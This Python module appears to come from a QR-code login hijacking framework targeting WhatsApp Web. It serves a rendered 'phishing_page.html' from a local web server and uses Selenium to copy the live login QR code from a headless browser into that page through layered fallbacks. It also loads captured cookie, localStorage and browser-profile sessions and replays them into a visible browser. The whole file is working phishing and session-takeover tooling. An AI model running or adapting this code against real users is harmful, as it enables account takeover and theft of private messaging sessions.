#!/usr/bin/env python3
import base64
import http.server
import json
import os
import random
import socketserver
import threading
from binascii import a2b_base64

from . import Settings


class server:
    def __init__(self, template_name="phishing_page.html", *args, **kwargs):
        self.templates_dir = os.path.join(Settings.path, "core", "templates")
        self.httpd = None
        self.server_thread = None

        self.name = kwargs.get("name", "unknown")
        self.port = kwargs.get("port", 8080)

        try:
            from jinja2 import Environment, FileSystemLoader, select_autoescape

            env = Environment(
                loader=FileSystemLoader(searchpath=self.templates_dir),
                autoescape=select_autoescape(["html", "xml"]),
            )
            template = env.get_template(template_name)
            self.html = template.render(*args, **kwargs)
        except ImportError as exc:
            raise RuntimeError(
                "Jinja2 is required to render module templates."
            ) from exc
        except Exception as e:
            raise RuntimeError(f"Failed to load template {template_name}: {str(e)}")

        # Validate port
        if not isinstance(self.port, int):
            try:
                self.port = int(self.port)
            except ValueError:
                raise ValueError(f"Port must be an integer, got {self.port}")

        if self.port < 1 or self.port > 65535:
            raise ValueError(f"Port must be between 1 and 65535, got {self.port}")

    def start_serving(self, host="127.0.0.1"):
        serve_dir = os.path.join(Settings.path, "core", "www", self.name)

        # Ensure directory exists
        try:
            os.makedirs(serve_dir, exist_ok=True)
        except Exception as e:
            raise RuntimeError(f"Failed to create serving directory: {str(e)}")

        # Write index.html
        try:
            index_path = os.path.join(serve_dir, "index.html")
            with open(index_path, "w") as f:
                f.write(self.html)
        except Exception as e:
            raise RuntimeError(f"Failed to write index.html: {str(e)}")

        # Define reusable server with proper cleanup
        class ReusableTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
            allow_reuse_address = True
            logging = False
            daemon_threads = True  # Ensure threads are daemonic

        class MyHandler(http.server.SimpleHTTPRequestHandler):
            def __init__(self, *args, **kwargs):
                super().__init__(*args, directory=serve_dir, **kwargs)

            def handle(self):
                try:
                    super().handle()
                except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError):
                    pass

            def log_message(self, format, *args):
                if self.server.logging:
                    http.server.SimpleHTTPRequestHandler.log_message(
                        self, format, *args
                    )

            def log_error(self, format, *args):
                if self.server.logging:
                    http.server.SimpleHTTPRequestHandler.log_error(self, format, *args)

        # Create and start server with error handling
        try:
            self.httpd = ReusableTCPServer((host, self.port), MyHandler)
            self.server_thread = threading.Thread(
                target=self.httpd.serve_forever,
                name=f"{self.name} webserver",
                daemon=True,
            )
            self.server_thread.start()
        except OSError as e:
            if "Address already in use" in str(e):
                raise RuntimeError(
                    f"Port {self.port} is already in use. Choose a different port."
                )
            else:
                raise RuntimeError(f"Failed to start server: {str(e)}")

    def stop_web_server(self):
        """Safely shut down the web server."""
        if self.httpd:
            try:
                self.httpd.shutdown()
                self.httpd.server_close()
            except Exception:
                # Graceful fallback if shutdown fails
                try:
                    if self.httpd.socket:
                        self.httpd.socket.close()
                except Exception:
                    pass
            finally:
                self.httpd = None


class misc:
    @staticmethod
    def Screenshot(browser, img_xpath, name):
        """Capture QR code image and save as tmp.png for the webserver.

        Uses a 4-tier strategy designed for WhatsApp Web's headless quirks:

        Tier 1  – canvas.toDataURL() via JS on a direct <canvas> match.
        Tier 1b – canvas.toDataURL() on the first <canvas> child when the
                  XPath matched a wrapper div (common in WhatsApp Web 2025).
        Tier 2  – Selenium 4 element.screenshot() for non-canvas elements.
        Tier 3  – Full-page screenshot + crop (legacy fallback).
        """
        www_dir = os.path.join(Settings.path, "core", "www", name)
        tmp_path = os.path.join(www_dir, "tmp.png")
        os.makedirs(www_dir, exist_ok=True)

        try:
            from selenium.webdriver.common.by import By
        except ImportError as exc:
            raise RuntimeError("Selenium is required for screenshot capture.") from exc
        try:
            from PIL import Image
        except ImportError as exc:
            raise RuntimeError("Pillow is required for screenshot capture.") from exc

        imgObject = browser.find_element(By.XPATH, img_xpath)

        try:
            tag = imgObject.tag_name.lower()
        except Exception:
            tag = ""

        # ── Tier 1 / 1b: canvas.toDataURL() ─────────────────────────────────
        # Headless Firefox returns a blank image for <canvas> with
        # save_screenshot() / element.screenshot(), so we must use JS.
        # Tier 1b handles the case where the XPath matched a wrapper <div>.
        canvas_element = None
        if tag == "canvas":
            canvas_element = imgObject
        else:
            try:
                canvas_element = imgObject.find_element(By.XPATH, ".//canvas")
            except Exception:
                canvas_element = None

        if canvas_element is not None:
            try:
                data_url = browser.execute_script(
                    "return arguments[0].toDataURL('image/png');", canvas_element
                )
                if data_url and data_url.startswith("data:image/png;base64,"):
                    png_bytes = base64.b64decode(data_url.split(",", 1)[1])
                    # A blank / unpainted canvas toDataURL() ≈ 85 bytes.
                    # A rendered QR code is typically 10-50 KB.
                    # 1 KB threshold safely rejects placeholder canvases.
                    if len(png_bytes) > 1024:
                        with open(tmp_path, "wb") as f:
                            f.write(png_bytes)
                        return  # ✓ Tier 1 / 1b success
                    # Canvas painted but empty – fall through
            except Exception:
                pass  # Fall through to Tier 2

        # ── Tier 2: Selenium 4 element.screenshot() ──────────────────────────
        try:
            imgObject.screenshot(tmp_path)
            with Image.open(tmp_path) as img:
                w, h = img.size
                if w > 10 and h > 10:
                    return  # ✓ Tier 2 success
        except Exception:
            pass  # Fall through to Tier 3

        # ── Tier 3: Full page screenshot + crop (legacy fallback) ────────────
        full_path = os.path.join(www_dir, "full.png")
        browser.save_screenshot(full_path)
        with Image.open(full_path) as img:
            left = imgObject.location["x"]
            top = imgObject.location["y"]
            right = left + imgObject.size["width"]
            bottom = top + imgObject.size["height"]
            box = (int(left), int(top), int(right), int(bottom))
            if box[2] <= box[0] or box[3] <= box[1]:
                raise ValueError(f"QR element has zero/negative size: {box}")
            final = img.crop(box)
            final.save(tmp_path)
        try:
            os.remove(full_path)
        except OSError:
            pass

    @staticmethod
    def base64_to_image(base64_data):
        # Becomes useful if the targeted website is loading the image from a base64 string
        return a2b_base64(base64_data.replace("data:image/png;base64,", ""))

    @staticmethod
    def gen_random():
        # Generate a random number to use in file naming
        return str(random.randint(1, 100) + random.randint(1, 1000))


def normalize_session_id(session_id):
    if session_id is None:
        return None
    if isinstance(session_id, (list, tuple)) and len(session_id) >= 3:
        session_id = session_id[2]
    session_id = str(session_id).strip()
    if not session_id:
        return None
    return session_id if session_id.lower() != "auto" else "auto"


def load_sessions(sessions_file=None):
    sessions_file = sessions_file or os.path.join("sessions", "sessions.json")
    if not os.path.exists(sessions_file):
        return None
    try:
        with open(sessions_file, "r", encoding="utf-8") as fh:
            sessions = json.load(fh)
            # Validate session structure
            if not isinstance(sessions, dict):
                raise ValueError("Invalid sessions file format: expected dictionary")
            for sid, data in sessions.items():
                if not isinstance(data, dict):
                    raise ValueError(f"Invalid session {sid}: expected dictionary")
                if "name" not in data or "session_type" not in data:
                    raise ValueError(f"Invalid session {sid}: missing required fields")
            return sessions
    except json.JSONDecodeError as je:
        raise RuntimeError(f"Corrupted sessions file (JSON error): {je}")
    except ValueError as ve:
        raise RuntimeError(f"Invalid sessions file format: {ve}")
    except Exception as exc:
        raise RuntimeError(f"Unexpected error loading sessions: {exc}")


def find_candidate_sessions(sessions, module_name=None, session_type=None):
    module_name = str(module_name).lower() if module_name else None
    session_type = str(session_type).lower() if session_type else None
    candidates = []
    for sid, data in sessions.items():
        name = str(data.get("name", "")).lower()
        s_type = str(data.get("session_type", "")).lower()
        if module_name and name != module_name:
            continue
        if session_type and s_type != session_type:
            continue
        candidates.append((sid, data))
    return candidates


def resolve_post_session(global_options, module_name=None, session_type=None):
    session_id = normalize_session_id(
        global_options.get("session_id", [None, None, ""])[2]
    )
    sessions = load_sessions()
    if sessions is None:
        raise FileNotFoundError("Sessions file not found. Run a grabber module first.")

    if session_id and session_id != "auto":
        if session_id in sessions:
            session_info = sessions[session_id]
            actual_name = str(session_info.get("name", "")).lower()
            actual_type = str(session_info.get("session_type", "")).lower()
            if module_name and actual_name != module_name.lower():
                raise ValueError(
                    f"Session {session_id} exists, but belongs to '{actual_name}'."
                )
            if session_type and actual_type != session_type.lower():
                raise ValueError(
                    f"Session {session_id} type mismatch: expected '{session_type}', got '{actual_type}'."
                )
            return session_id
        raise ValueError(f"Session {session_id} not found in sessions file.")

    candidates = find_candidate_sessions(sessions, module_name, session_type)
    if len(candidates) == 1:
        return candidates[0][0]
    if not candidates:
        raise ValueError(
            "No matching sessions found. Use 'sessions -l' to list available captured sessions."
        )
    candidate_list = ", ".join(
        [f"{sid} ({data.get('name')})" for sid, data in candidates]
    )
    raise ValueError(
        f"Multiple matching sessions found: {candidate_list}. Set session_id to one of these IDs."
    )


def load_post_session(session_type, session_id, visible_browser):
    session_type = str(session_type or "").lower()
    loader_map = {
        "localstorage": "load_localstorage",
        "cookies": "load_cookie",
        "profile": "load_profile",
    }
    loader_name = loader_map.get(session_type)
    if not loader_name:
        raise ValueError(f"Unsupported post session type: {session_type}")

    loader = getattr(visible_browser, loader_name, None)
    if not callable(loader):
        raise AttributeError(
            f"Visible browser has no loader for '{session_type}' sessions."
        )

    loader(session_id)


# Options format: [Required or not, option_description, default_value]
# Required     --> 1 # Means that it must have value
# Not required --> 0 # Means that it could have value or not
class types:
    class grabber:
        options = {
            "port": [1, "The local port to listen on.", 8080],
            "host": [1, "The local host to listen on.", "127.0.0.1"],
            "useragent": [
                1,
                "Make useragent is the (default) one, a (random) generated useragent or a specifed useragent",
                "(default)",
            ],
        }

    class post:
        options = {"session_id": [1, "Session id to run the module on", ""]}
